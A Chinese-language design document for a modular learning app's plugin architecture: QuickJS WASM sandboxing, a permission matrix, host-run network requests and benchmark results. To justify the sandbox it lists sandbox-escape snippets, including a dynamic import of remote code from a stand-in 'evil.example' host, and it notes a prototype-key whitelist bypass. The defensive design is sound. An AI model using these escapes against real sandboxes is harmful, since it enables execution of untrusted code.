# Matrix 实现设计（v0.4）

> **2026-10-18 当前实现说明**：本文件保留架构目标与历史论证，不能将所有图中能力当作已交付。
> 内置插件仍进程内执行；外部 .mtp 每插件独立 QuickJS WASM、纯 JSON 桥、主线程限时调用。
> UI 统一返回受限 UiNode，支持首页独立卡片与专属页，不运行外部 iframe；Worker、验签、市场、外部通知/后台均未开放。
> 外部账号可声明精确来源，由 Android 隔离 WebView Profile 托管网页登录；每插件一个账号，旧 WebView 不支持时明确失败，插件不接触凭证。
> Android 双页桌面挂件使用真实快照与内置连接器后台同步；去掉常驻按钮和状态，上滑看课程、下滑回 DDL，不循环。两页分别按尺寸/系统字号放置完整条目，页内静态；DDL 与 App 同序，课程仅含今天尚未下课的课时。单击联网并短暂提示 BB/GS 结果；320 ms 内同项双击取消单击：BB 到课程、GS 到作业、课程进入 App 课表。当前原生 ListView 宿主没有分页吸附，短拖可能停在两页之间，此项仍待解决。独立 StackView 实验存在叠层及行点击标识丢失，未合并。iOS 挂件、日程课表融合和 Web SQLite 修复不在本轮范围。

> DDL 紧凑界面与挂件共用纯函数显示投影：仅去除明确学期、操作前缀并归一编号名称；保留未知后缀和个人命名，全量集合先消歧，详情保留完整名称。投影不改平台快照、实体标识、时间、链接或排序。
> 首版包读取 manifest.json + bundle.js，不加载 assets 或 signature。最新操作规范见 [插件指南](../plugins/README.md)，缺口见 [GAPS](GAPS.md)，进度见 [dev.md](../../dev.md)。


> 面向对象：全体大众（非开发者）的模块化学习辅助软件。手机端优先（Android → iOS），后期 Windows。
> 技术路线：TypeScript + React + Capacitor / Electron + SQLite。
> 本文档讨论「怎么实现」，并对原始需求中若干处技术假设提出修正。
>
> **v0.3 变更**：P0 三个技术验证已执行完毕，结论见 **[`spikes/p0/REPORT.md`](../../spikes/p0/REPORT.md)**。
> 其中 S4 的异步 RPC 验证**证伪**了 v0.2 的 §5.5 协议，促成本轮两项新决策：
> **D8**（插件纯函数化，沙箱内无异步宿主 API）、**D9**（一个插件 VM 独占一个 WASM 模块实例）。
> §5.5、§11.1、§13、附录 A 已同步更新。
>
> **v0.4 变更（真机验证后）**：S1/S2/S3 三项从「纸面推演」升级为「真机确认」，见 §13.1。
> 其中 **S2 拿到了最强证据** —— 移除 `INTERNET` 权限的构建在真机上功能完整。
> 另有一项**架构简化**：原计划自写 Kotlin `CorePlugin` 被证明不必要，
> **核心层改为纯 TypeScript**（传输复用 `CapacitorHttp`），**D6 与 §15 第 2 项已修订**，见 §7.4。
> 真机测试还暴露了 6 个纸面看不出的缺陷（`mode` 语义、降级排序、库名冲突、切换迁移、
> `set-cookie` 泄漏、审计读回不显示），已修复并回写 §5.5.2 与 §13.1。
> **核心层亦已真机确认**：HTTP 200、302 逐跳复检、cookie 收走并持有、重启后审计可见（本机 83 项断言）。
> 同时如实记录了两项**纯 TS 无法解决**的限制：跨插件 cookie 隔离（§8.2）、
> JSON 响应体的 parse→stringify 往返（§8.1）。

---

## 0. 结论先行

原始需求的技术路线（TS + React + Capacitor/Electron + SQLite）成立，但有 **9 个承重决策** 需要先定，否则后面会返工。
D8 / D9 与对 D2 的修订来自 P0 实证（见 `spikes/p0/REPORT.md`）：

| # | 决策 | 选择 | 为什么 |
|---|---|---|---|
| D1 | 沙箱边界放在哪 | **第三方代码运行在 QuickJS(WASM)；当前 UI 返回 UiNode 由宿主渲染，任意 iframe 延后** | 原方案「Worker + 受限 API 代理」不是安全边界，JS 猴子补丁可被 `(function(){}).constructor('return fetch')()` 绕过 |
| D2 | 网络出口在哪 | **所有 HTTP 由核心层发出；UI 层与插件层都不进行任何网络交互**（插件只能「声明请求」，由核心代发） | 这样「插件只能访问白名单域名」是内核强制的，而不是靠约定。P0-S4 后进一步收紧：插件层也零网络 |
| D3 | 插件能不能写 SQL | **不能。插件用「集合 + 查询 DSL」，宿主编译成参数化 SQL** | 命名空间前缀拼接做隔离在 SQL 层面不可靠（子查询、CTE、`ATTACH`、`PRAGMA`） |
| D4 | 内置功能是否也走插件 API | **是，但内置插件是「in-process 一等公民」**，用同一套 API，只是不做跨进程隔离 | 保留「内核尽可能薄」的收益，同时不牺牲首屏性能与开发速度 |
| D5 | 布局 JSON 能不能带代码 | **绝对不能。Schema 是纯数据 + 声明式绑定表达式** | 否则「布局可导出分享」就变成「分享即执行任意代码」 |
| D6 | 核心层放在哪 | **下沉到原生层**：网络网关 / 凭证库 / SQLite 做成原生 Capacitor 插件，JS 侧只留薄 RPC 客户端。**（v0.4 修订：改用 `@capacitor/core` 自带的 `CapacitorHttp` 作为原生传输层，策略逻辑写在 TS 侧，无需自写 Kotlin —— 见 §7.4）** | 让移动端也拿到运行时硬边界，`connect-src 'none'` 才有机会成立（否则核心与 UI 同 realm，隔离只是架构约定） |
| D7 | 运行时远程代码 | **默认拒绝；插件可申请用户授予「远程代码信任」，逐插件、显式、可撤销** | 参考 VS Code Workspace Trust。签名覆盖的代码可直接执行，未覆盖的必须用户点头（详见 §5.7） |
| D8 | 插件与宿主怎么交互 | **插件是纯函数；沙箱内不存在任何异步宿主 API。宿主在沙箱外代跑一切 IO**，多步流程用「返回下一步指令 → 宿主执行 → 再调一次」的状态机表达 | P0-S4 **证伪**了「插件侧 `await` 宿主 RPC」这条路：顺序 await 第二次必崩，且 asyncify 状态是 WASM 模块实例级的，一处损坏全局连坐（详见 §5.5） |
| D9 | 插件 VM 怎么隔离 | **一个插件 VM 独占一个 QuickJS WASM 模块实例**；当前主线程调用，独立 Worker 是后续调度目标 | 同上：asyncify 状态是模块实例级全局状态，共享实例等于共享命运 |


---

## 1. 与原始需求的偏差修正

以下是需求文档里我认为**必须改**的地方，其余部分基本认可。

### 1.1 「Worker + 受限 API 代理」不构成沙箱

Worker 与主线程同源，`fetch` / `XMLHttpRequest` / `WebSocket` / `importScripts` / `indexedDB` 全都在。在 Worker 启动时删除这些全局对象只是**策略**，不是**边界**：

```js
// 三种常见逃逸，删全局对象挡不住
(function(){}).constructor('return fetch')()          // 从 Function 构造器取回
await import('https://evil.example/x.js')             // 动态 import 不受全局删除影响
new Worker(URL.createObjectURL(new Blob([...])))      // 再开一个干净的 Worker
```

**修正**：逻辑插件/连接器/解析器跑在 **QuickJS(WASM)** 里。它是一个独立解释器，全局对象由宿主从零构造 —— 插件世界里根本不存在 `fetch` 这个标识符，逃逸需要 WASM 引擎自身的内存安全漏洞。代价比预想小得多：`quickjs-emscripten@0.32` 的 release-sync wasm 实测 **503 KB**，解释执行较慢、不能操作 DOM。对「解析文本 / 调接口 / 写数据」这类 IO 密集型插件完全可以接受。（ShadowRealm 至今未在任何浏览器发布，不能作为方案。）

### 1.2 「插件通过 dataBus 写核心表」需要更明确的写入契约

dataBus 不能是「随便 emit 一个 JSON 就落库」。**修正**：实体类型由插件在 manifest 里声明 JSON Schema，宿主校验后才落库；跨插件读取必须显式声明 `data.read`。默认全隔离。

### 1.3 「连接器插件运行在 Worker 中通过宿主网关发请求」的时序问题

认证发生在**安装时/首次同步时**，可能早于 Worker 启动，也可能在后台 Worker 被回收之后。**修正**：会话（Session）的生命周期归宿主，插件只拿一个进程内有效的**不可猜测句柄**；Worker 重启后句柄失效则重新 `auth.session()` 换取，宿主用持久化的 refresh 逻辑续期。

### 1.4 微信解析：把「分享/导出」当主路径，自动化当增强

Android 的通知监听需要用户去系统设置手动授权，且微信通知经常只有「你有一条新消息」；Windows 微信 4.x 本地库是加密的，第三方工具（chatlog / PyWxDump）都必须**从运行中的微信进程内存里扫描密钥**，且已知支持范围仅到 Windows < 4.0.3.36（更新版本是否仍可未知）。**修正**：MVP 支持「分享到 Matrix」+「粘贴文本」；通知监听与本地库读取作为可选增强，默认关闭。

### 1.5 「课前推送」在 Android 上不是免费的

**修正**：提醒采用三级降级 —— 精确闹钟（已授权）→ WorkManager 非精确周期任务（最小 15 分钟）→ 打开 App 时补推 + 应用内横幅。注意 **Android 14 起 `SCHEDULE_EXACT_ALARM` 对 target 33+ 的新安装默认拒绝**，必须 `canScheduleExactAlarms()` 检查 + `ACTION_REQUEST_SCHEDULE_EXACT_ALARM` 引导；`USE_EXACT_ALARM` 虽安装即授予，但 Play 政策只允许闹钟/日历类应用，本项目不应依赖它。**因此默认预期就是「不精确」，产品文案不承诺「准点」。**

### 1.6 关于 ToS / 合规

Gradescope、Piazza、互动教学平台均无公开 API（已核实，见附录 A），模拟会话抓取可能违反 ToS，涉及学生个人信息还牵涉《个人信息保护法》/ FERPA。**修正**：连接器做成**可卸载的独立插件**，默认全部本地处理、不上传任何聊天记录；提供数据导出与一键清除；连接器首次启用时明确告知风险。

---

## 2. 仓库结构

pnpm workspaces + Turborepo。**关键点：只有一个 React 应用（`apps/shell`），Capacitor 与 Electron 都只是它的壳。**

```
matrix/
├─ apps/
│  ├─ shell/                  # ★ 唯一业务代码：React 宿主 UI
│  │  ├─ src/boot/            # 装配：kernel → platform → data → pluginHost → ui
│  │  ├─ src/routes/
│  │  └─ src/plugins/builtin/ # 内置插件的 React 实现（Timeline / 课表）
│  ├─ mobile/                 # Capacitor 壳（android/ ios/ + 自定义原生插件）
│  │  ├─ capacitor.config.ts
│  │  └─ src/native/          # NotificationListener、ExactAlarm、CookieBridge
│  └─ desktop/                # Electron 壳（main / preload / utilityProcess）
│     └─ electron/main.ts
├─ packages/
│  ├─ kernel/                 # DI、生命周期、事件总线、日志、错误、结果类型
│  ├─ plugin-api/             # ★ 版本化契约，对外发布给插件作者
│  ├─ plugin-host/            # manifest、注册表、权限引擎、RPC broker、沙箱运行时
│  │  ├─ src/sandbox/quickjs.ts
│  │  ├─ src/sandbox/iframe.ts
│  │  └─ src/rpc/{broker,dispatch,errors}.ts
│  ├─ data/                   # SQLite 抽象、迁移、命名空间、查询编译器、dataBus
│  ├─ platform/               # PlatformAdapter 接口 + 能力探测
│  │  └─ src/{capacitor,electron,web}/
│  ├─ net/                    # HTTP 网关：白名单、限流、重试、审计、SSRF 防护
│  ├─ auth/                   # 认证代理、凭证库、会话句柄、刷新
│  ├─ ui/                     # Schema 渲染器、组件注册表、主题 token、布局引擎
│  ├─ domain/                 # 领域模型与用例（纯函数，无 IO）
│  └─ shared/
├─ plugins/                   # 内置/官方插件（编译进包 or 独立分发）
│  ├─ timeline/ timetable/ layout-editor/ importer-ics/
│  ├─ connector-ecloud/ connector-gradescope/ connector-piazza/
│  └─ parser-wechat/
├─ tools/
│  ├─ plugin-cli/             # create / build / sign / pack / dev-server
│  └─ conformance/            # 平台适配层一致性测试套件
└─ docs/design/
```

### 构建产物关系

```
apps/shell ──build──▶ dist/  ──┬──▶ Capacitor: 复制进 android/app/src/main/assets/public
                              └──▶ Electron:  file:// 或 app:// 加载
```

两个壳都不包含业务逻辑，只提供 `PlatformAdapter` 实现。这是「各端复用同一套业务代码」的落地方式。

---

## 3. 运行时拓扑

### 移动端（WebView + 原生核心）

核心层（网络网关、凭证库、SQLite）**下沉到原生侧**，WebView 里只剩 UI 与插件宿主。

```
┌─ WebView ─────────────────────────────────────────────┐
│  UI 渲染器（React）  ← 只吃 ViewModel，无网络原语      │
│  plugin-host（沙箱管理 / RPC broker / 权限引擎）       │
│  core-client（薄 RPC 客户端，唯一对外通道）            │
│  ├─ Worker#1  QuickJS VM ← 连接器插件 A                │
│  ├─ Worker#2  QuickJS VM ← 解析器插件 B                │
│  └─ iframe (opaque origin) ← 第三方 UI 插件 C          │
└──────────── Capacitor Bridge（非网络）────────────────┘
                          │
┌─ Native（Java/Kotlin）────────────────────────────────┐
│  CorePlugin: 网络网关（白名单/限流/审计/缓存）         │
│             凭证库（Keystore）+ 会话管理               │
│             SQLite（SQLCipher）                        │
│  LocalNotifications / AlarmManager / WorkManager       │
│  NotificationListenerService（自写）                   │
└───────────────────────────────────────────────────────┘
```

**关键性质**：WebView 内**不存在任何网络代码**，因此 `connect-src 'none'` 才有可能成立 —— Capacitor 的 JS↔Native bridge 在 Android 走 `@JavascriptInterface`、iOS 走 `WKScriptMessageHandler`，**本身都不是网络请求**，不占用 `connect-src` 配额。

### 桌面端（Electron 多进程）

```
main process ── 原生 HTTP 网关 + safeStorage(DPAPI) + 窗口管理
   │  IPC
   ├─ renderer (sandbox:true, contextIsolation:true, nodeIntegration:false)
   │     └─ 同移动端的 React 宿主 UI（同一份 dist/）
   ├─ utilityProcess: SQLite(better-sqlite3) —— 不阻塞 UI
   └─ WebContentsView(partition:'plugin-<id>', sandbox:true) ← 第三方 UI 插件
```

**桌面端的网络边界比移动端更强**：renderer 的 CSP 设 `connect-src 'none'`，宿主自己的请求也走 IPC 到 main，因此插件即使拿到 `fetch` 也无处可去。

---

## 4. 内核（kernel）：尽可能薄

内核只负责「让插件能跑起来」，**不含任何学习功能**。

```ts
// packages/kernel/src/index.ts
export interface Kernel {
  readonly di: Container;          // 轻量 DI，按 token 注册/解析
  readonly bus: EventBus;          // 进程内类型化事件总线
  readonly log: Logger;
  readonly clock: Clock;           // 可注入，便于测试
  readonly lifecycle: Lifecycle;   // startup / ready / suspend / resume / shutdown
  readonly errors: ErrorReporter;
}
```

不在内核里的东西（全部是插件或独立 package）：课表、DDL、Timeline、通知、网络、认证、布局编辑器。

**插件系统的装配顺序**（`apps/shell/src/boot`）：

```
1. platform.attach(adapter)      // 探测能力，打开数据库
2. data.migrate()                // 核心表迁移
3. net.attach(platform.http)     // 网络网关绑定到原生 HTTP
4. auth.attach(vault, net)       // 凭证库 + 会话
5. pluginHost.attach(registry)   // 读取 plugin_registry，恢复已安装插件
6. pluginHost.activateAll()      // 内置插件先激活，第三方按需激活
7. ui.mount()                    // 渲染布局
```

---

## 5. 插件系统

### 5.1 五种形态与运行位置

| 形态 | 运行位置 | 隔离强度 | 能做什么 | 典型用途 |
|---|---|---|---|---|
| `declarative` | 无代码 | 最强 | 只有 Schema + 数据映射 | 简单视图、仪表盘卡片 |
| `logic` | Worker 内 QuickJS | 强（真边界） | 注入的 `ctx` | 解析器、同步逻辑、后台任务 |
| `connector` | Worker 内 QuickJS | 强 | `ctx.net` / `ctx.auth` | 平台接入 |
| `ui` | 不透明源 iframe / WebContentsView | 强（DOM 边界 + CSP） | postMessage RPC | 复杂自定义界面 |
| `first-party` | 宿主进程内 | 无（受信） | 全量 API + React 组件 | 内置 Timeline / 课表 / 布局编辑器 |

内置插件用 `first-party` 是为了性能和开发体验，但**它调用的 API 与第三方完全一致**，因此任何内置插件在需要时都能被「搬出去」变成沙箱插件。

### 5.2 Manifest v1

```jsonc
{
  "id": "org.shtu.ecloud",
  "name": "E云课堂连接器",
  "version": "1.2.0",
  "apiVersion": "^1.0.0",
  "kind": "connector",
  "entry": "bundle.js",                 // declarative / first-party 可省略
  "engines": { "platform": ["android", "windows", "web"] },

  "permissions": {
    "data":  { "write": ["ddl", "course", "session"], "read": ["course"] },
    "net":   { "domains": ["ecloud.shanghaitech.edu.cn"], "methods": ["GET", "POST"] },
    "auth":  { "providers": ["shtu-sso"] },
    "notify": false,
    "background": { "periodic": true, "exact": false },
    "secrets": true,                     // 仅限自身命名空间
    "fs": "none",
    "ui": { "components": [], "slots": ["home.cards"] }
    // "local": true                     // 需要宿主提供的本地资源（用户选的文件等）
  },

  "contributes": {
    "entityTypes": [ { "name": "course", "schema": { /* JSON Schema 子集 */ } } ],
    "views": [ /* declarative Schema 片段 */ ],
    "commands": [ { "id": "sync", "title": "立即同步" } ],
    "connectors": [ { "id": "ecloud", "authProvider": "shtu-sso", "syncIntervalMin": 30 } ]
  },

  "integrity": { "algo": "ed25519", "hash": "sha256-…", "sig": "…" }
}
```

**保留命名空间**（实现时补上的约束，原设计没写）：

| 前缀 | 归属 | 谁能用 |
|---|---|---|
| `dev.matrix.*` | 宿主内置插件（与 `appId: dev.matrix.shell` 同命名空间） | 只有**编译进应用**的插件 |
| `app.matrix.*` | 官方第一方插件 | 同上（签名落地后改为「官方密钥签名验证通过」） |
| 其它 | 第三方 | 自由取（推荐反向域名，如 `org.shtu.ecloud`） |

> ⚠️ **这一节曾经文档与实现不一致**：原示例用的是 `app.matrix.connector.ecloud`，
> 并声称它「是合法的」。实际上 `validateManifest()` 对所有调用方都**无条件**拒绝保留前缀 ——
> 官方第一方当时也拿不到自己的命名空间，两个前缀都是死的。已按下面的方式修掉。

**唯一的开锁方式**：宿主显式传 `allowReservedPrefix: true`
（`validateManifest(raw, { allowReservedPrefix: true })` / `install(raw, { allowReservedPrefix: true })`）。

刻意**不**用 `kind === 'first-party'` 当豁免条件：`kind` 是 manifest **自己声称**的，
第三方照抄就能绕过（运行时自报的 kind 本来就以 manifest 为准，见 §5.6 的握手核对）。
而「这个文件是编译进应用的」是**宿主知道、manifest 无法声称**的事实 ——
信任判断必须建立在后者上，否则就是个假开关。第三方安装流程永远不传这个开关。

> 注意保留的**只是自命名**。插件**依赖**其它插件时不受此限制 ——
> 「我依赖 `app.matrix.timeline`」和「我叫 `app.matrix.xxx`」是两件事。

**`contributes.entityTypes` 的形状**（实现时定的，原设计只写了「JSON Schema」）：

```ts
entityTypes: Array<{ name: string; schema: EntitySchema }>
```

即**每一项带名字**，而不是 `{ course: {...}, ddl: {...} }` 这样的映射。
理由是 `DataBus.declareSchema(pluginId, type, schema)` 需要 `type` 作为一等参数
（它要参与键构造、配额统计、跨插件读取），把名字放在外层更省一次解构。
⚠️ 这仍是**提案**：它没经过真实插件的检验，改起来也便宜。

**字段级 `shared` 投影**（同样是我的提案，非原设计）：

```jsonc
"properties": {
  "title":        { "type": "string" },
  "internalNote": { "type": "string", "shared": false }   // 跨插件读取时被裁掉
}
```

`DataBus.read()` 在**跨插件**读取时按 `shared !== false` 裁剪字段；读自己写的记录不裁
（否则插件拿不回自己存的东西）。**为什么需要它**：Timeline 这类消费方要读别的插件的数据，
但「能读这门课」不等于「能读这门课的内部备注」。没有字段级裁剪，
跨插件读取就只有「全给」和「全不给」两个选项，前者迟早泄漏内部字段。
⚠️ 这同样是**提案**，`shared` 的默认值（缺省视为共享）也是提案 —— 更保守的默认是
「缺省不共享」，但那会让绝大多数插件作者踩坑，所以选了显式 `false` 才裁。

### 5.3 权限矩阵（RPC 方法 → 所需权限，默认拒绝）

| RPC 方法 | 所需权限 | 运行时附加约束 |
|---|---|---|
| `db.*` | 隐式 | 只能碰 `plugin_<自身id>_*` |
| `db.raw` | `db.raw` | **默认拒绝**，需人工审核 + 签名白名单 |
| `bus.emit(entity)` | `data.write` 含 entity | 载荷过 JSON Schema 校验 + 配额 |
| `bus.read(entity)` | `data.read` 含 entity | 只返回声明过的字段投影 |
| `net.request(url)` | host ∈ `net.domains` | 走原生网关；重定向逐跳复检 |
| `auth.login(provider)` | `auth.providers` 含 provider | 宿主托管 UI，插件不接触凭证 |
| `notify.local` | `notify` | 频次限制，防轰炸 |
| `schedule.exact` | `background.exact` | 需系统授权，否则自动降级 |
| `secrets.*` | `secrets` | 只能读写自身命名空间 |
| `fs.read/write` | `fs` | 路径白名单（插件沙箱目录内） |
| `ui.registerComponent` | `ui.components` | 需审核 + 签名 |
| `llm.complete` | `llm.local` | 强制本地推理，禁止出网 |
| `trust.evalRemote(source)` | `capabilities.remoteCode` + 信任等级 = `remote-trusted` | 未授予抛 `ETRUST`；**只在沙箱内执行**（I6） |
| `trust.loadModule(id)` | manifest `dependencies` 含 id | 目标插件须已安装且已验签；**用调用方权限执行**（I5） |

**配额**（超限抛 `EQUOTA`）：DB 行数/字节数、网络请求数/分钟、缓存文件大小、通知条数/小时。配额在安装确认页展示。

### 5.4 版本协商与向后兼容

- manifest 声明 `apiVersion: "^1.0.0"`（semver range）。
- 宿主启动插件前做握手：`{ apiVersion, hostVersion, capabilities[] }`，不满足则拒绝激活并给出可读原因（`EAPIVERSION`）。
- **兼容策略**：宿主同时加载 v1 与 v2 的 API 实现（同一份 RPC 路由，方法级适配层），承诺支持 N-2 个大版本；废弃方法先 `warn` 一个版本周期再移除。
- 能力探测优于版本探测：插件应查 `host.capabilities.has('notify.local')` 而不是查平台名。

### 5.5 插件契约：纯函数 + 声明式请求（决策 D8）

> **本节在 P0-S4 后被重写。** 原设计是「插件侧 `await ctx.net.request(...)`，宿主用
> `newAsyncifiedFunction` 提供异步实现」。实测**证伪**：顺序 await 第二次宿主调用必崩，
> 且 asyncify 状态是 WASM 模块实例级的全局状态，一处损坏全局连坐。
> 完整证据见 `spikes/p0/REPORT.md` §4。

**新契约：沙箱内不存在任何异步宿主 API。插件是纯函数。**

```ts
// 插件导出（沙箱内，全同步，无 Promise / 无 await）
export interface ConnectorPlugin {
  /** 声明「我需要哪些请求」。插件不碰网络，只产出请求描述。 */
  plan(input: PlanInput): RequestPlan;

  /** 纯函数解析：宿主把响应体当普通字符串传进来，插件算完返回普通 JSON。 */
  parsers: Record<string, (input: ParseInput) => ParseResult>;

  /** 多步流程：插件返回下一步指令，宿主执行后再调一次。 */
  next?(input: StepInput): StepDirective | null;
}

export interface RequestPlan {
  requests: Array<{
    id: string;
    method: 'GET' | 'POST';
    url: string;                     // 必须落在 manifest 声明的 origins 内
    headers?: Record<string, string>;
    body?: string;
    parse: string;                   // 用哪个 parser 处理响应
  }>;
}

export interface ParseInput {
  body: string;                      // 宿主抓回来的响应体
  status: number;
  baseUrl: string;
  credentials?: never;               // 凭证永不进沙箱
}

export interface StepDirective {
  next: string;                      // 下一个 parser/step 名
  requests: RequestPlan['requests']; // 需要宿主再跑哪些请求
}
```

**执行流程（全部在宿主侧驱动）：**

```
1. 宿主调 plugin.plan(input)                      → { requests: [...] }
2. 宿主校验每个 url 落在 manifest origins 白名单内   → 不在则 ENETDENIED
3. 宿主发起网络请求（这是全应用唯一的网络出口）
4. 宿主调 plugin.parsers[name]({ body, status, baseUrl })
5. 宿主取回结果落库 / 广播 dataBus
6. 若返回 StepDirective，回到第 2 步；超过 maxSteps 则 ETIMEOUT
```

**为什么这个改动是净收益：**

| 维度 | 异步 RPC（已废弃） | 纯函数（采用） |
|---|---|---|
| 沙箱内异步机制 | asyncify | 无 |
| WASM 崩溃风险 | 高（顺序 await 必崩） | 无 |
| 插件可测性 | 需要 mock 整个宿主 | 纯函数，直接单测 |
| 网络出口 | 插件间接触发 | 宿主显式代发，审计点唯一 |
| 凭证隔离 | 需要额外约束 | 结构上不可能接触 |

**代价（诚实记录，数字来自 `spikes/p0/REPORT.md` §5）：**
插件无法表达「边解析边决定下一次请求」的隐式控制流，必须显式拆成状态机步骤。
对课程/DDL/Quiz 这类连接器足够；若将来要做真正的交互式爬虫，需要重新评估。

**跨边界开销（S5 实测）：**

| 项目 | 实测（Node 24 + quickjs-emscripten，桌面 CPU） |
|---|---|
| 固定调用开销 | ≈ **16 µs/次** |
| 1 MiB 载荷，`evalCode(JSON 字面量)` | 12.7 ms → 15.4 MB/s |
| 1 MiB 载荷，`newString` + 沙箱内 `JSON.parse` | 3.6 ms → **54.9 MB/s**（快 **3.56×**） |

→ **编组规范：大 body 必须用 `newString` + 沙箱内 `JSON.parse`**，不要用 `evalCode('(' + JSON + ')')`。
前者走 JS 语法分析器，后者走高度优化的 `JSON.parse`。整页 HTML（1 MiB ≈ 3.6 ms）完全可以传进沙箱。

**⚠️ 状态机写法（S5 推翻了一条原指导）：**

原话说「大文档有拷贝开销」——**真正的坑不在大文档，而在累积状态每步往返**：

| 步数 | 状态跨边界（朴素写法） | 状态留沙箱 | 差距 |
|---|---|---|---|
| 20 | 95.8 µs/步 | 20.2 µs/步 | 4.7× |
| 100 | 304.7 µs/步 | 22.1 µs/步 | 13.8× |
| 400 | **1.04 ms/步** | 19.0 µs/步 | **54.7×** |

单步耗时随步数线性上升 → 合计 **O(n²)**。而沙箱内的模块级/闭包状态在多次调用间**是存活的**
（实测连续 3000 次调用后状态完好）。

→ **规范：声明式状态机不得把累积状态每步传进传出，只传增量与摘要。**
这条必须写进插件 API 契约，否则插件作者会用朴素写法，然后在几百步时莫名其妙变慢。

**`net.stream` 为二期能力（已决策）：**

S5 证明**同步**流式回调是安全的 —— S4 崩的是 **asyncified** 调用（沙箱内 `await` 挂起），
而同步回调走普通 `callFunction`，**完全不碰 asyncify**（实测 3000 次稳定，早期中止生效）。
它能拿回「增量处理」与「提前中止」，代价仅 16 µs/块。

**但本期不启用**：当前声明式模型对课程/DDL/Quiz 这类连接器已经足够，
过早开放会扩大权限矩阵与攻击面。留作二期独立权限项 `net.stream`（授予后插件可注册
**同步**的 `onChunk(chunk) → { stop, next? }`，宿主驱动循环；**回调必须同步**是硬约束）。

⚠️ 且须记住：`net.stream` 给的是**解析**层面的增量，**不是传输**层面的增量 ——
`CapacitorHttp` 不暴露 body 流（见 §8.1），分块只能由宿主在拿到完整响应后切分。
真正的传输层流式需要换掉 `CapacitorHttp`，属于「必须自写原生」的范畴。

**绝不把宿主对象暴露进沙箱**（`Response` / `Headers` / `AbortController` 一律不给）：
收益 ≈ 0（数据一样），代价是边界从「纯数据」退化成「代理对象图」——
任何一处泄漏（方法返回 `this`、异常携带宿主对象、原型链可达）都是越界。
详见 `spikes/p0/REPORT.md` §5.4。

**错误码：两套码空间（v0.4 修订，原设计只有一套 8 个码）**

实现 `packages/plugin-api/src/v1/errors.ts` 时发现单一码空间表达不了真实的失败原因，
于是拆成两套。**这不是重命名，是两类不同的失败**：

```ts
// 契约码 —— 「插件用错了 API」
type PluginContractCode =
  | 'EPERM'        // 未声明 / 未授权（含试图自带凭证头）
  | 'EAPIVERSION'  // API 版本协商失败
  | 'EQUOTA'       // 超出配额（含 maxSteps、单轮请求数）
  | 'ENETDENIED'   // 域名不在**该插件被授予的**白名单内
  | 'EAUTH'        // 令牌无效 / 凭据不足
  | 'ESCHEMA'      // 实体或 plan 校验失败
  | 'ETIMEOUT'     // 状态机步数超限
  | 'ETRUST'       // 信任状态不允许该操作
  | 'EMANIFEST'    // manifest 非法，或运行时自报 kind 与 manifest 不符
  | 'ENOTFOUND'    // 插件 / 导出 / 实体类型不存在
  | 'EINTERNAL';   // 宿主内部错误

// 传输码 —— 「出网时怎么失败的」，由核心层网关抛出
type CoreTransportCode =
  | 'EURL' | 'EIP' | 'EHOST' | 'EREDIRECT'
  | 'ETIMEOUT' | 'ETOOBIG' | 'ERATELIMIT' | 'EAUTH'
  | 'ENET' | 'EUNKNOWN';

type PluginErrorCode = PluginContractCode | CoreTransportCode;
```

**为什么必须分开**：插件发起的一次 fetch 可能因为「URL 写错了」失败（`EURL`），
也可能因为「域名没被授权」失败（`ENETDENIED`）。如果边界类型只表达得了后者，
宿主就只能把前者**谎报**成后者 —— 而失败原因是用户排查问题的唯一线索。

`EAUTH` 与 `ETIMEOUT` **刻意同时属于两套空间**，因为它们是真正的双语义：
令牌无效（核心）／凭据不足（契约）；HTTP 超时（核心）／状态机步数超限（契约）。
合并成一个码反而会让「到底是网络超时还是插件死循环」不可分辨。

`packages/plugin-api` 的一致性测试里有一个**编译期穷尽性守卫**
（`const coverage: Record<CoreErrorCode, true> = {...}`）：核心层一旦新增错误码
而契约没跟上，`tsc` 直接失败。`apps/shell/src/core/plugin-api-diff.test.ts`
再做运行时复核，逐项验证「核心层抛出的每个码都能被适配器如实上报」。

> ⚠️ 上面 `CoreTransportCode` 的 `EUNKNOWN` 不在核心层 `CoreErrorCode` 的 9 个码里 ——
> 它是核心层「拿不到确定分类」时的兜底，因此两边数量是 11 / 10 而不是 11 / 9。

**iframe UI 插件**：仍用 `postMessage`，宿主校验 `event.source` 与 `event.origin`
（不透明源时 origin 为 `"null"`，因此**额外用一次性 token 做身份绑定**，不能只信 origin）。
⚠️ 注意：Android 的 `addJavascriptInterface` 会把原生桥注入 WebView 的**所有 frame**，
所以不透明源 iframe **不是**对原生桥的隔离边界 —— 原生桥只能有窄入口，
且授权必须靠「每次调用携带的能力令牌」，不能靠 frame 来源判定（详见 §11）。

### 5.5.1 QuickJS 硬性纪律（R1–R6）

以下每一条都是 P0 实测踩出来的，违反任一会导致 WASM 内存越界或模块实例永久损坏：

| # | 纪律 | 违反后果 |
|---|---|---|
| **R1** | **绝不混用同步 `evalCode` 与 `evalCodeAsync`**；运行时路径一律走 `evalCodeAsync` | 同步 evalCode 一旦碰到 asyncified 函数，asyncify 状态被永久挂起，同模块实例下所有 runtime 全部报废（`Already suspended`） |
| **R2** | 求值结果必须是 `undefined`（代码末尾加 `undefined;`） | 若返回 pending promise handle，宿主 `dump` 后 `dispose` 它，promise 落定时 QuickJS 踩到已释放 lifetime |
| **R3** | 不要用 `ctx.resolvePromise()` | 即使 promise 已 settle 也会挂死 |
| **R4** | 宿主回调内构造返回值只能用 `newObject` / `newString` / `newNumber` / `ctx.true` | 用 `evalCode` 会重入 asyncify |
| **R5** | 宿主回调内必须在**第一个 `await` 之前**取完所有参数 handle | `await` 之后 handle 可能已失效 |
| **R6** | 异常状态下的 `dispose()` 会触发 WASM abort —— 必须 try/catch 包裹，并**丢弃整个模块实例**重建 | abort 本身可捕获（进程不死），但模块实例已污染 |

> 采用 D8 的纯函数模型后，R1–R5 大多不再触发（因为根本不进 asyncify 路径），
> 但**必须保留为代码规范**，以防将来有人重新引入异步宿主 API。

### 5.5.2 其他实证修正

- **JSON 对象字面量必须用括号包起来再求值**：`evalCode('{"a":1}')` 会把 `{...}` 当块语句解析，
  `"a":` 不是合法标签 → 报 `expecting ';'`。数组、数字、字符串、`null` 在语句位置合法，只有 `{...}` 踩坑。
  正确写法：`` evalCode(`(${JSON.stringify(v)})`) ``。
- **`ctx.callFunction` 返回的是 `DisposableSuccess`/`DisposableFail`（Either），不是 handle**，必须先 `.unwrap()`。
- **按名字查表一律用 `Object.hasOwn` / `Map`，禁止裸 `obj[key]` 真值判断**：
  `spec.fields['__proto__']` 返回 `Object.prototype`（真值），`['constructor']` 返回 `Function`（真值），
  朴素白名单会被直接绕过。P0-S1 实测复现。

